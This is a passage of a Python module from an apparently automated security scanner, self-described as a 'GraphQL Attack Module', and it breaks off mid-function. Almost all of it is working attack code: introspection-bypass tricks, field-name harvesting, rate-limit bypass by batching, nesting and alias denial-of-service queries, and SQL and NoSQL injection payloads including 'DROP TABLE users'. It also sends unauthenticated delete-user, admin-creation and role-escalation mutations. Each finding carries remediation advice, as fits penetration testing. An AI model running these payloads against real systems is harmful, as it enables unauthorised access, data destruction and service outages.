"""
GraphQL Attack Module — Deep exploitation of GraphQL APIs

Tests for:
1. Introspection — full schema extraction (even when disabled)
2. Field Suggestion Leak — use typo queries to extract field names from error messages
3. Batching Attack — send N operations in one request to bypass rate limits
4. Deep Nesting DoS — nested query that causes exponential resolution
5. Alias-based DoS — duplicate same field with aliases for amplification
6. Injection — SQLi/NoSQL injection through GraphQL arguments
7. Authorization Bypass — access unauthorized fields/mutations via direct query
8. Information Disclosure — __type, __schema queries that leak internal types
9. Directive Abuse — @skip, @include for logic bypass
10. Subscription Abuse — WebSocket subscription enumeration
"""
import asyncio
import json
import logging
import re
import time
from urllib.parse import urljoin

import httpx

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# Full introspection query
INTROSPECTION_QUERY = """{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name kind description
      fields(includeDeprecated: true) {
        name description isDeprecated deprecationReason
        args { name description type { ...TypeRef } defaultValue }
        type { ...TypeRef }
      }
      inputFields { name description type { ...TypeRef } defaultValue }
      interfaces { ...TypeRef }
      enumValues(includeDeprecated: true) { name description isDeprecated }
      possibleTypes { ...TypeRef }
    }
    directives { name description locations args { name type { ...TypeRef } } }
  }
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
}"""

# Compact introspection (no fragment, simpler)
INTROSPECTION_COMPACT = """{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name kind
      fields(includeDeprecated: true) {
        name
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind ofType { name kind } } }
      }
      inputFields { name type { name kind ofType { name kind } } }
      enumValues { name }
    }
  }
}"""

# SQL error patterns
SQL_ERROR_PATTERNS = [
    re.compile(r"(SQL syntax|mysql_fetch|ORA-\d{5}|pg_query|sqlite3?\.|"
               r"unterminated quoted string|syntax error at or near|"
               r"Unclosed quotation mark|Microsoft OLE DB|"
               r"SQLSTATE\[|Syntax error in string|"
               r"com\.mysql\.jdbc|java\.sql\.SQL|org\.postgresql)", re.IGNORECASE),
]

# Sensitive field names
SENSITIVE_FIELDS = {
    "password", "passwordhash", "password_hash", "secret", "token",
    "apikey", "api_key", "ssn", "creditcard", "credit_card", "cvv",
    "private_key", "privatekey", "session", "sessiontoken", "refresh_token",
    "accesstoken", "access_token", "hash", "salt", "otp", "pin",
}

# Admin-like field/type names
ADMIN_INDICATORS = {
    "admin", "internal", "debug", "system", "superuser", "root",
    "management", "staff", "moderator", "operator", "backoffice",
    "dashboard", "analytics", "metrics", "logs", "audit",
}


class GraphQLAttackModule:
    """Comprehensive GraphQL security testing module."""

    COMMON_GRAPHQL_PATHS = [
        "/graphql", "/graphql/v1", "/graphql/v2", "/api/graphql",
        "/query", "/gql", "/graphiql", "/playground",
        "/api/gql", "/v1/graphql", "/v2/graphql",
        "/graphql/console", "/api/v1/graphql", "/api/v2/graphql",
        "/graphql/api", "/data", "/api/data",
    ]

    def __init__(self, context: dict):
        self.context = context
        self.base_url = context.get("base_url", "")
        self.endpoints = context.get("endpoints", [])
        self.auth_cookie = context.get("auth_cookie")
        self.session_cookies = context.get("session_cookies", {})
        self.auth_headers_ctx = context.get("auth_headers", {})
        self.rate_limit = self.context.get("rate_limit") or 5
        self.semaphore = asyncio.Semaphore(self.rate_limit)
        self.findings: list[dict] = []
        self.headers = self._build_headers()

    def _build_headers(self) -> dict:
        headers = {"Content-Type": "application/json"}
        if self.auth_headers_ctx:
            headers.update(self.auth_headers_ctx)
        if self.session_cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.session_cookies.items())
        elif self.auth_cookie:
            if self.auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {self.auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = self.auth_cookie
        return headers

    async def run(self, context: dict) -> list[dict]:
        """Main entry point — discover GraphQL endpoints and attack them."""
        self.findings = []

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            self.client = client

            # Step 1: Discover GraphQL endpoints
            graphql_urls = await self._discover_graphql()

            if not graphql_urls:
                logger.info("GraphQL: no endpoints found")
                return []

            logger.info(f"GraphQL: found {len(graphql_urls)} endpoint(s): {graphql_urls}")

            # Step 2: Run attacks on each endpoint (limit to 5)
            for gql_url in graphql_urls[:5]:
                schema = None

                # Introspection
                schema = await self._try_introspection(gql_url)
                if schema:
                    types_info = self._summarize_schema(schema)
                    self.findings.append(self._make_finding(
                        "GraphQL Introspection Enabled", gql_url, "medium",
                        f"Full schema exposed via introspection. "
                        f"Found {types_info['type_count']} types, "
                        f"{types_info['mutation_count']} mutations, "
                        f"{types_info['query_fields']} query fields. "
                        f"Sensitive fields: {', '.join(types_info['sensitive_fields'][:10]) or 'none detected'}.",
                        "Disable introspection in production (set introspection: false)",
                        payload=INTROSPECTION_COMPACT,
                        response_data={"types": types_info["type_names"][:30]},
                    ))

                # Introspection bypass (when disabled)
                if not schema:
                    schema = await self._introspection_bypass(gql_url)
                    if schema:
                        self.findings.append(self._make_finding(
                            "GraphQL Introspection Bypass", gql_url, "high",
                            "Introspection disabled but bypassed via alternative query format. "
                            "Attacker can extract full API schema.",
                            "Use allowlist-based query validation, not just introspection blocking",
                        ))

                # Field suggestion leak
                leaked = await self._field_suggestion_attack(gql_url, schema)
                if leaked:
                    self.findings.append(self._make_finding(
                        "GraphQL Field Suggestion Information Leak", gql_url, "medium",
                        f"Error messages reveal valid field names via 'Did you mean' suggestions. "
                        f"Leaked fields: {', '.join(sorted(leaked)[:25])}",
                        "Disable field suggestions in production error messages",
                        response_data={"leaked_fields": sorted(leaked)[:50]},
                    ))

                # Batching attack
                batch_result = await self._batch_attack(gql_url)
                if batch_result:
                    self.findings.append(batch_result)

                # Deep nesting DoS
                nesting_result = await self._deep_nesting_test(gql_url, schema)
                if nesting_result:
                    self.findings.append(nesting_result)

                # Alias amplification
                alias_result = await self._alias_amplification(gql_url, schema)
                if alias_result:
                    self.findings.append(alias_result)

                # Injection through arguments
                injection_results = await self._test_injections(gql_url, schema)
                self.findings.extend(injection_results)

                # Authorization bypass
                authz_results = await self._test_authz_bypass(gql_url, schema)
                self.findings.extend(authz_results)

                # Directive abuse
                directive_result = await self._directive_abuse(gql_url, schema)
                if directive_result:
                    self.findings.append(directive_result)

                # Information disclosure via __type
                info_results = await self._type_info_disclosure(gql_url, schema)
                self.findings.extend(info_results)

        return self.findings

    # ── Discovery ──────────────────────────────────────────────────────

    async def _discover_graphql(self) -> list[str]:
        """Find GraphQL endpoints by probing common paths + checking existing endpoints."""
        found = set()

        # Check known endpoints from previous phases
        for ep in self.endpoints:
            url = ep.get("url", "") if isinstance(ep, dict) else str(ep)
            if any(gql in url.lower() for gql in ["graphql", "graphiql", "/gql", "/query", "playground"]):
                full = url if url.startswith("http") else urljoin(self.base_url, url)
                found.add(full)

        # Probe common paths concurrently
        async def probe(path: str):
            url = self.base_url.rstrip("/") + path
            if url in found:
                return None
            async with self.semaphore:
                try:
                    resp = await self.client.post(url, json={"query": "{__typename}"}, timeout=8)
                    if resp.status_code in (200, 400):
                        try:
                            body = resp.json()
                            if "data" in body or "errors" in body:
                                return url
                        except (json.JSONDecodeError, ValueError):
                            pass
                    # Also try GET
                    resp2 = await self.client.get(url, params={"query": "{__typename}"}, timeout=8)
                    if resp2.status_code in (200, 400):
                        try:
                            body2 = resp2.json()
                            if "data" in body2 or "errors" in body2:
                                return url
                        except (json.JSONDecodeError, ValueError):
                            pass
                except Exception:
                    pass
            return None

        tasks = [probe(p) for p in self.COMMON_GRAPHQL_PATHS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, str):
                found.add(r)

        return list(found)

    # ── Introspection ──────────────────────────────────────────────────

    async def _try_introspection(self, url: str) -> dict | None:
        """Attempt full introspection query via POST JSON, POST form, GET."""
        queries = [INTROSPECTION_QUERY, INTROSPECTION_COMPACT]

        for query in queries:
            # POST JSON
            try:
                async with self.semaphore:
                    resp = await self.client.post(url, json={"query": query}, timeout=15)
                schema = self._extract_schema(resp)
                if schema:
                    return schema
            except Exception:
                pass

            # GET with query param
            try:
                async with self.semaphore:
                    resp = await self.client.get(url, params={"query": query}, timeout=15)
                schema = self._extract_schema(resp)
                if schema:
                    return schema
            except Exception:
                pass

        return None

    async def _introspection_bypass(self, url: str) -> dict | None:
        """Try to bypass introspection protection with multiple techniques."""
        bypass_techniques = [
            # 1. __type instead of __schema (often not blocked)
            {"query": '{__type(name:"Query"){name fields{name type{name kind}}}}'},
            # 2. Newline/whitespace obfuscation
            {"query": "{\n\n  __schema\n  {\n    types\n    {\n      name\n      fields { name }\n    }\n  }\n}"},
            # 3. Aliased introspection
            {"query": '{a:__schema{types{name fields{name type{name}}}}}'},
            # 4. POST with operationName
            {"query": INTROSPECTION_COMPACT, "operationName": "IntrospectionQuery"},
            # 5. Using query keyword explicitly
            {"query": "query{__schema{types{name kind fields{name}}}}"},
            # 6. Mixed case (some naive filters)
            {"query": '{__Schema{types{name}}}'},
            # 7. With variables (confuses some WAFs)
            {"query": "query Q($a:Boolean!){__schema@include(if:$a){types{name fields{name}}}}", "variables": {"a": True}},
            # 8. Batch with introspection hidden in array
            [{"query": "{__typename}"}, {"query": INTROSPECTION_COMPACT}],
        ]

        for technique in bypass_techniques:
            try:
                async with self.semaphore:
                    if isinstance(technique, list):
                        resp = await self.client.post(url, json=technique, timeout=15)
                        try:
                            body = resp.json()
                            if isinstance(body, list) and len(body) > 1:
                                schema = self._parse_schema_data(body[1].get("data", {}))
                                if schema:
                                    return schema
                        except (json.JSONDecodeError, ValueError, IndexError):
                            pass
                    else:
                        resp = await self.client.post(url, json=technique, timeout=15)
                        schema = self._extract_schema(resp)
                        if schema:
                            return schema
                        # Also check __type response
                        try:
                            body = resp.json()
                            type_data = body.get("data", {}).get("__type") or body.get("data", {}).get("a")
                            if type_data and "fields" in type_data:
                                return {"types": [type_data], "_partial": True}
                        except (json.JSONDecodeError, ValueError):
                            pass
            except Exception:
                pass

        # 9. GET-based bypass
        for q in [INTROSPECTION_COMPACT, '{__type(name:"Query"){name fields{name type{name kind}}}}']:
            try:
                async with self.semaphore:
                    resp = await self.client.get(url, params={"query": q}, timeout=15)
                schema = self._extract_schema(resp)
                if schema:
                    return schema
            except Exception:
                pass

        return None

    def _extract_schema(self, resp: httpx.Response) -> dict | None:
        """Parse schema from introspection response."""
        if resp.status_code not in (200, 201):
            return None
        try:
            body = resp.json()
            return self._parse_schema_data(body.get("data", {}))
        except (json.JSONDecodeError, ValueError):
            return None

    def _parse_schema_data(self, data: dict) -> dict | None:
        """Extract types list from schema data."""
        if not data:
            return None
        schema = data.get("__schema")
        if schema and "types" in schema:
            return schema
        # Might be partial (__type query)
        type_data = data.get("__type") or data.get("a")
        if type_data and isinstance(type_data, dict):
            return {"types": [type_data], "_partial": True}
        return None

    def _summarize_schema(self, schema: dict) -> dict:
        """Extract useful summary from schema."""
        types = schema.get("types", [])
        user_types = [t for t in types if not t.get("name", "").startswith("__")]
        all_fields = []
        sensitive = []
        mutation_count = 0
        query_fields = 0

        for t in types:
            fields = t.get("fields") or []
            for f in fields:
                fname = (f.get("name") or "").lower()
                all_fields.append(fname)
                if fname in SENSITIVE_FIELDS:
                    sensitive.append(f"{t.get('name', '?')}.{f.get('name', '?')}")

        mt = schema.get("mutationType")
        if mt:
            mt_name = mt.get("name", "Mutation")
            for t in types:
                if t.get("name") == mt_name:
                    mutation_count = len(t.get("fields") or [])

        qt = schema.get("queryType")
        if qt:
            qt_name = qt.get("name", "Query")
            for t in types:
                if t.get("name") == qt_name:
                    query_fields = len(t.get("fields") or [])

        return {
            "type_count": len(user_types),
            "type_names": [t.get("name", "") for t in user_types],
            "mutation_count": mutation_count,
            "query_fields": query_fields,
            "sensitive_fields": sensitive,
            "all_field_names": all_fields,
        }

    # ── Field Suggestion Leak ──────────────────────────────────────────

    async def _field_suggestion_attack(self, url: str, schema: dict | None) -> set[str]:
        """Send queries with intentional typos to extract field names from error messages."""
        leaked = set()
        suggestion_re = re.compile(r'[Dd]id you mean\s*["\']?(\w+)', re.IGNORECASE)
        suggestion_re2 = re.compile(r'Cannot query field\s*["\'](\w+).*?[Dd]id you mean\s+(.*?)[\.\?]', re.IGNORECASE)
        suggestion_re3 = re.compile(r'["\'](\w+)["\']', re.IGNORECASE)

        probe_queries = [
            '{usrs{id}}', '{usr{id}}', '{me{idd}}',
            '{admn{id}}', '{adm1n{id}}', '{flg{id}}',
            '{internl{id}}', '{secrt{id}}', '{dbg{id}}',
            '{cnfig{id}}', '{seeting{id}}', '{profle{id}}',
            '{accnt{id}}', '{passwrd{id}}', '{tokn{id}}',
            '{ordr{id}}', '{transactn{id}}', '{paymnt{id}}',
            '{prodct{id}}', '{custmer{id}}', '{employe{id}}',
        ]

        # If we have schema, add probes based on known type names
        if schema:
            for t in schema.get("types", []):
                name = t.get("name", "")
                if not name.startswith("__") and len(name) > 2:
                    # Create typo by removing last char
                    probe_queries.append('{' + name[:-1].lower() + '{id}}')

        for query in probe_queries[:30]:  # limit probes
            try:
                async with self.semaphore:
                    resp = await self.client.post(url, json={"query": query}, timeout=8)
                if resp.status_code in (200, 400):
                    text = resp.text
                    # Parse "Did you mean" suggestions
                    for m in suggestion_re2.finditer(text):
                        # Parse the suggestions list
                        suggestions_str = m.group(2)
                        for s in suggestion_re3.findall(suggestions_str):
                            if len(s) > 1 and not s.startswith("__"):
                                leaked.add(s)
                    for m in suggestion_re.finditer(text):
                        field = m.group(1)
                        if len(field) > 1 and not field.startswith("__"):
                            leaked.add(field)
            except Exception:
                pass

        return leaked

    # ── Batching Attack ────────────────────────────────────────────────

    async def _batch_attack(self, url: str) -> dict | None:
        """Test if query batching is enabled — allows rate limit bypass."""
        # Send a batch of 50 identical queries
        batch = [{"query": "{__typename}"} for _ in range(50)]
        try:
            async with self.semaphore:
                resp = await self.client.post(url, json=batch, timeout=15)
            if resp.status_code == 200:
                try:
                    body = resp.json()
                    if isinstance(body, list) and len(body) >= 50:
                        return self._make_finding(
                            "GraphQL Query Batching Enabled (Rate Limit Bypass)", url, "medium",
                            f"Server processes batched queries — {len(body)} operations executed in "
                            f"a single HTTP request. Attacker can bypass rate limiting by batching "
                            f"login attempts, password resets, or brute-force queries.",
                            "Limit maximum batch size to 1-5 operations, or disable batching entirely",
                            payload=json.dumps(batch[:3]) + "...",
                        )
                except (json.JSONDecodeError, ValueError):
                    pass
        except Exception:
            pass
        return None

    # ── Deep Nesting DoS ───────────────────────────────────────────────

    async def _deep_nesting_test(self, url: str, schema: dict | None) -> dict | None:
        """Test query depth limit by building deeply nested queries."""
        # Build nesting probes from schema relationships or common patterns
        nesting_probes = []

        if schema and not schema.get("_partial"):
            # Find circular type references
            pairs = self._find_circular_refs(schema)
            for field_a, field_b in pairs[:3]:
                depth = 10
                inner = "id"
                for _ in range(depth):
                    inner = f"{field_b}{{{field_a}{{{inner}}}}}"
                nesting_probes.append("{" + f"{field_a}{{{inner}}}" + "}")

        # Generic nesting patterns
        nesting_probes.extend([
            # Relay-style pagination nesting
            '{users{edges{node{friends{edges{node{friends{edges{node{friends{edges{node{id}}}}}}}}}}}}}',
            # Self-referential
            '{user(id:1){friends{friends{friends{friends{friends{friends{friends{id}}}}}}}}}',
            '{node(id:"1"){...on User{friends{...on User{friends{...on User{friends{...on User{id}}}}}}}}}}',
        ])

        for probe in nesting_probes[:5]:
            try:
                async with self.semaphore:
                    start = time.monotonic()
                    resp = await self.client.post(url, json={"query": probe}, timeout=15)
                    elapsed = time.monotonic() - start

                if resp.status_code == 200:
                    try:
                        body = resp.json()
                        if body.get("data") and not body.get("errors"):
                            return self._make_finding(
                                "GraphQL No Query Depth Limit (DoS)", url, "high",
                                f"Server processes deeply nested queries without depth restriction. "
                                f"Response time: {elapsed:.1f}s. An attacker can craft exponentially "
                                f"expensive queries to cause denial of service.",
                                "Implement query depth limiting (max 7-10 levels) and query complexity analysis",
                                payload=probe[:500],
                            )
                    except (json.JSONDecodeError, ValueError):
                        pass
                    # Slow response without error may indicate processing
                    if elapsed > 5.0:
                        return self._make_finding(
                            "GraphQL Possible DoS via Deep Nesting", url, "medium",
                            f"Deeply nested query took {elapsed:.1f}s to process, suggesting "
                            f"no effective depth or complexity limits.",
                            "Implement query depth limiting and complexity analysis",
                            payload=probe[:500],
                        )
            except httpx.TimeoutException:
                return self._make_finding(
                    "GraphQL DoS via Deep Nesting (Timeout)", url, "high",
                    "Deeply nested query caused server timeout — no depth limit enforced. "
                    "Full denial of service possible with crafted queries.",
                    "Implement query depth limiting (max 7-10 levels) and query complexity analysis",
                    payload=probe[:500],
                )
            except Exception:
                pass

        return None

    def _find_circular_refs(self, schema: dict) -> list[tuple[str, str]]:
        """Find pairs of fields that reference each other (for nesting attacks)."""
        type_map = {}
        for t in schema.get("types", []):
            name = t.get("name", "")
            if name.startswith("__"):
                continue
            fields = t.get("fields") or []
            type_map[name] = fields

        pairs = []
        for type_name, fields in type_map.items():
            for f in fields:
                ft = f.get("type", {})
                target = self._resolve_type_name(ft)
                if target and target in type_map:
                    # Check if target has a field pointing back
                    for f2 in type_map[target]:
                        ft2 = f2.get("type", {})
                        if self._resolve_type_name(ft2) == type_name:
                            pairs.append((f.get("name", ""), f2.get("name", "")))
        return pairs

    @staticmethod
    def _resolve_type_name(type_info: dict) -> str | None:
        """Unwrap NON_NULL/LIST wrappers to get the base type name."""
        if not type_info:
            return None
        while type_info.get("kind") in ("NON_NULL", "LIST") and type_info.get("ofType"):
            type_info = type_info["ofType"]
        return type_info.get("name")

    # ── Alias Amplification ────────────────────────────────────────────

    async def _alias_amplification(self, url: str, schema: dict | None) -> dict | None:
        """Use aliases to duplicate expensive operations in a single query."""
        # Pick a likely expensive field
        target_field = "__typename"
        if schema and not schema.get("_partial"):
            qt = schema.get("queryType", {})
            qt_name = qt.get("name", "Query") if qt else "Query"
            for t in schema.get("types", []):
                if t.get("name") == qt_name:
                    for f in (t.get("fields") or []):
                        fname = f.get("name", "")
                        if fname.lower() in ("users", "posts", "orders", "products",
                                              "transactions", "items", "messages", "events"):
                            target_field = fname
                            break

        # Build 100 aliases
        aliases = " ".join(f"a{i}:{target_field}" for i in range(100))
        query = "{" + aliases + "}"

        try:
            async with self.semaphore:
                start = time.monotonic()
                resp = await self.client.post(url, json={"query": query}, timeout=15)
                elapsed = time.monotonic() - start

            if resp.status_code == 200:
                try:
                    body = resp.json()
                    data = body.get("data", {})
                    if data and len(data) >= 50:
                        return self._make_finding(
                            "GraphQL Alias-Based Amplification (No Complexity Limit)", url, "medium",
                            f"Server resolved {len(data)} aliased operations in one request "
                            f"({elapsed:.1f}s). Attacker can amplify expensive queries (e.g., "
                            f"database lookups) without query complexity limits.",
                            "Implement query complexity/cost analysis to limit total field resolution count",
                            payload="{a0:" + target_field + " a1:" + target_field + " ... a99:" + target_field + "}",
                        )
                except (json.JSONDecodeError, ValueError):
                    pass
        except httpx.TimeoutException:
            return self._make_finding(
                "GraphQL Alias Amplification DoS (Timeout)", url, "high",
                "100 aliased query fields caused a server timeout — no complexity limit. "
                "Effective denial of service vector.",
                "Implement query complexity/cost analysis",
                payload=query[:300],
            )
        except Exception:
            pass

        return None

    # ── Injection Testing ──────────────────────────────────────────────

    async def _test_injections(self, url: str, schema: dict | None) -> list[dict]:
        """Test SQL/NoSQL injection through GraphQL arguments."""
        findings = []

        # Build injection test cases
        sqli_payloads = [
            ('1\' OR \'1\'=\'1', "sqli"),
            ('1" OR "1"="1', "sqli"),
            ("1; DROP TABLE users--", "sqli"),
            ("1' UNION SELECT null,null,null--", "sqli"),
            ("1' AND SLEEP(3)--", "sqli_time"),
            ("1' AND 1=CONVERT(int,(SELECT @@version))--", "sqli"),
        ]
        nosql_payloads = [
            ('{"$gt": ""}', "nosql"),
            ('{"$ne": null}', "nosql"),
            ('{"$regex": ".*"}', "nosql"),
        ]

        # Get fields with arguments from schema
        arg_fields = []
        if schema and not schema.get("_partial"):
            qt = schema.get("queryType", {})
            qt_name = qt.get("name", "Query") if qt else "Query"
            for t in schema.get("types", []):
                if t.get("name") == qt_name:
                    for f in (t.get("fields") or []):
                        args = f.get("args", [])
                        str_args = [a for a in args if self._is_string_arg(a)]
                        if str_args:
                            arg_fields.append((f.get("name"), str_args))

        # If no schema, use common patterns
        if not arg_fields:
            arg_fields = [
                ("user", [{"name": "id"}, {"name": "email"}, {"name": "name"}]),
                ("users", [{"name": "search"}, {"name": "filter"}, {"name": "where"}]),
                ("search", [{"name": "query"}, {"name": "q"}, {"name": "term"}]),
                ("login", [{"name": "username"}, {"name": "email"}, {"name": "password"}]),
            ]

        for field_name, args in arg_fields[:10]:
            for arg in args[:3]:
                arg_name = arg.get("name", "id")
                all_payloads = sqli_payloads + nosql_payloads

                for payload, inject_type in all_payloads:
                    query = '{' + f'{field_name}({arg_name}:"{payload}")' + '{id}}'
                    try:
                        async with self.semaphore:
                            start = time.monotonic()
                            resp = await self.client.post(url, json={"query": query}, timeout=10)
                            elapsed = time.monotonic() - start

                        if resp.status_code in (200, 500):
                            text = resp.text
                            # Check for SQL error patterns
                            for pattern in SQL_ERROR_PATTERNS:
                                if pattern.search(text):
                                    findings.append(self._make_finding(
                                        f"GraphQL SQL Injection ({field_name}.{arg_name})", url, "critical",
                                        f"SQL error triggered via GraphQL argument '{arg_name}' in "
                                        f"field '{field_name}'. Error pattern found in response.",
                                        "Use parameterized queries in GraphQL resolvers",
                                        parameter=arg_name,
                                        payload=query,
                                        response_data={"snippet": text[:500]},
                                    ))
                                    break

                            # Time-based check
                            if inject_type == "sqli_time" and elapsed > 3.0:
                                findings.append(self._make_finding(
                                    f"GraphQL Blind SQL Injection ({field_name}.{arg_name})", url, "critical",
                                    f"Time-based blind SQLi via GraphQL argument '{arg_name}' in "
                                    f"field '{field_name}'. SLEEP payload caused {elapsed:.1f}s delay.",
                                    "Use parameterized queries in GraphQL resolvers",
                                    parameter=arg_name,
                                    payload=query,
                                ))

                            # NoSQL data leak (returned more data than expected)
                            if inject_type == "nosql":
                                try:
                                    body = resp.json()
                                    data = body.get("data", {})
                                    result = data.get(field_name)
                                    if isinstance(result, list) and len(result) > 1:
                                        findings.append(self._make_finding(
                                            f"GraphQL NoSQL Injection ({field_name}.{arg_name})", url, "high",
                                            f"NoSQL operator injection via '{arg_name}' in '{field_name}' "
                                            f"returned {len(result)} results — data leak confirmed.",
                                            "Sanitize and validate all GraphQL arguments, reject operator objects",
                                            parameter=arg_name,
                                            payload=query,
                                        ))
                                except (json.JSONDecodeError, ValueError):
                                    pass
                    except Exception:
                        pass

                    # Stop after first finding per field+arg combo
                    if any(f.get("parameter") == arg_name and field_name in f.get("title", "")
                           for f in findings):
                        break

        return findings

    @staticmethod
    def _is_string_arg(arg: dict) -> bool:
        """Check if argument is a String type."""
        t = arg.get("type", {})
        while t and t.get("kind") in ("NON_NULL", "LIST"):
            t = t.get("ofType", {})
        return (t.get("name") or "").lower() in ("string", "id")

    # ── Authorization Bypass ───────────────────────────────────────────

    async def _test_authz_bypass(self, url: str, schema: dict | None) -> list[dict]:
        """Query admin/privileged fields and mutations without authentication."""
        findings = []

        # Build probe mutations and queries
        probes = [
            # Admin queries
            ('query', '{adminPanel{users{id email role}}}', "admin panel"),
            ('query', '{allUsers{totalCount edges{node{id email role}}}}', "all users"),
            ('query', '{users{id email role passwordHash}}', "user password hashes"),
            ('query', '{systemConfig{key value}}', "system configuration"),
            ('query', '{logs{id action user timestamp}}', "audit logs"),
            ('query', '{analytics{totalUsers revenue}}', "analytics data"),
            # Admin mutations
            ('mutation', 'mutation{deleteUser(id:"1"){id}}', "delete user"),
            ('mutation', 'mutation{updateRole(userId:"1",role:"admin"){id}}', "role escalation"),
            ('mutation', 'mutation{createUser(email:"test@test.com",role:"admin"){id}}', "create admin"),
            ('mutation', 'mutation{updateConfig(key:"debug",value:"true"){key}}', "config update"),
        ]

        # Add schema-based probes
        if schema and not schema.get("_partial"):
            mt = schema.get("mutationType", {})
            mt_name = (mt.get("name") if mt else None) or "Mutation"
            for t in schema.get("types", []):
                if t.get("name") == mt_name:
                    for f in (t.get("fields") or [])[:20]:
                        fname = f.get("name", "")
                        if any(a in fname.lower() for a in ("delete", "update", "create",
                                                            "admin", "config", "reset", "grant")):
                            # Build a minimal mutation call
                            args_str = self._build_dummy_args(f.get("args", []))
                            probes.append(
                                ('mutation', f'mutation{{{fname}{args_str}{{id}}}}', fname)
                            )

            # Look for types with admin/sensitive indicators
            for t in schema.get("types", []):
                tname = (t.get("name") or "").lower()
                if any(a in tname for a in ADMIN_INDICATORS):
                    fields = t.get("fields") or []
                    field_names = [f.get("name", "id") for f in fields[:5]]
                    fields_str = " ".join(field_names) or "id"
                    query_name = t.get("name", "")[0].lower() + t.get("name", "")[1:]
                    probes.append(
                        ('query', '{' + query_name + '{' + fields_str + '}}', f"type {t.get('name')}")
                    )

        # Send probes without authentication
        no_auth_headers = {"Content-Type": "application/json"}
        async with make_client(extra_headers=no_auth_headers, timeout=10.0) as unauth_client:
            for op_type, query, description in probes[:25]:
                try:
                    async with self.semaphore:
                        resp = await unauth_client.post(url, json={"query": query}, timeout=8)
                    if resp.status_code == 200:
                        try:
                            body = resp.json()
                            data = body.get("data", {})
                            errors = body.get("errors", [])
                            # Check if data was actually returned (not just null)
                            has_data = data and any(
                                v is not None and v != {} and v != []
                                for v in data.values()
                            )
                            has_auth_error = any(
                                "auth" in str(e.get("message", "")).lower() or
                                "permission" in str(e.get("message", "")).lower() or
                                "forbidden" in str(e.get("message", "")).lower() or
                                "unauthorized" in str(e.get("message", "")).lower()
                                for e in errors
                            )
                            if has_data and not has_auth_error:
                                severity = "critical" if op_type == "mutation" else "high"
                                findings.append(self._make_finding(
                                    f"GraphQL Authorization Bypass ({description})", url, severity,
                                    f"Unauthenticated access to {op_type} '{description}'. "
                                    f"Server returned data without requiring authentication.",
                                    "Implement field-level authorization in GraphQL resolvers",
                                    payload=query,
                                    response_data={"data_keys": list(data.keys())[:10]},
                                ))
                        except (json.JSONDecodeError, ValueError):
                            pass
                except Exception:
                    pass

        return findings

    @staticmethod
    def _build_dummy_args(args: list[dict]) -> str:
        """Build dummy argument string for mutation probing."""
        if not args:
            return ""
        parts = []
        for a in args[:5]:
            name = a.get("name", "")
            t = a.get("type", {})
            while t and t.get("kind") in ("NON_NULL", "LIST"):
                t = t.get("ofType", {})
            type_name = (t.get("name") or "").lower()
            if type_name in ("int", "float", "number"):
                parts.append(f'{name}:1')
            elif type_name == "boolean":
                parts.append(f'{name}:true')
            elif type_name == "id":
                parts.append(f'{name}:"1"')
            else:
                parts.append(f'{name}:"test"')
        return "(" + ",".join(parts) + ")" if parts else ""

    # ── Directive Abuse ────────────────────────────────────────────────

    async def _directive_abuse(self, url: str, schema: dict | None) -> dict | None:
        """Test @skip/@include directives for logic/authorization bypass."""
        # Some implementations check authorization before evaluating directives,
        # which means @skip(if:true) on a protected field might still trigger auth
        # but @include(if:false) might bypass it entirely
        probes = [
            # Include admin field with false (should be skipped, but resolver might run)
            '{user(id:"1"){id name adminFlag @include(if:false) role @skip(if:true)}}',
            # Custom directives that might exist
            '{user(id:"1"){id @deprecated email @cached}}',
            # Inline fragment with directive
            '{user(id:"1"){id ...@include(if:true){email role passwordHash}}}',
            # Skip authentication check with directive
            '{me @skip(if:false){id email role}}',
        ]

        for probe in probes:
            try:
                async with self.semaphore:
                    resp = await self.client.post(url, json={"query": probe}, timeout=8)
                if resp.status_code == 200:
                    try:
                        body = resp.json()
                        data = body.get("data", {})
                        errors = body.get("errors", [])
                        # Check for unexpected data in directive-skipped fields
                        if data and not errors:
                            for key, val in self._flatten_data(data).items():
                                if key.lower() in SENSITIVE_FIELDS and val is not None:
                                    return self._make_finding(
                                        "GraphQL Directive Abuse (Sensitive Data Leak)", url, "high",
                                        f"Using @include/@skip directives exposed sensitive field "
                                        f"'{key}' that should be protected. Directive evaluation "
                                        f"occurs after resolver execution.",
                                        "Ensure authorization checks happen before field resolution, "
                                        "not after directive evaluation",
                                        payload=probe,
                                    )
                    except (json.JSONDecodeError, ValueError):
                        pass
            except Exception:
                pass

        return None

    # ── Information Disclosure via __type ───────────────────────────────

    async def _type_info_disclosure(self, url: str, schema: dict | None) -> list[dict]:
        """Enumerate internal types via __type queries even when introspection is disabled."""
        findings = []

        # Common type names to probe
        type_names = [
            "User", "Admin", "AdminUser", "InternalUser", "SystemUser",
            "Config", "Setting", "Settings", "Configuration",
            "Token", "Session", "APIKey", "Secret",
            "Log", "AuditLog", "Event", "Debug",
            "Payment", "CreditCard", "BankAccount", "Transaction",
            "Mutation", "Query", "Subscription",
        ]

        # Add types from schema if available
        if schema:
            for t in schema.get("types", []):
                name = t.get("name", "")
                if not name.startswith("__") and name not in type_names:
                    type_names.append(name)

        disclosed_types = []
        for type_name in type_names[:30]:
            query = '{__type(name:"' + type_name + '"){name kind fields{name type{name kind}}}}'
            try:
                async with self.semaphore:
                    resp = await self.client.post(url, json={"query": query}, timeout=8)
                if resp.status_code == 200:
                    try:
                        body = resp.json()
                        type_data = (body.get("data") or {}).get("__type")
                        if type_data and type_data.get("fields"):
                            fields = [f.get("name", "") for f in type_data["fields"]]
                            sensitive = [f for f in fields if f.lower() in SENSITIVE_FIELDS]
                            admin = any(a in type_name.lower() for a in ADMIN_INDICATORS)
                            if sensitive or admin:
                                disclosed_types.append({
                                    "type": type_name,
                                    "fields": fields[:20],
                                    "sensitive": sensitive,
                                })
                    except (json.JSONDecodeError, ValueError):
                        pass
            except Exception:
                pass

        if disclosed_types:
            sensitive_summary = []
            for dt in disclosed_types:
                if dt["sensitive"]:
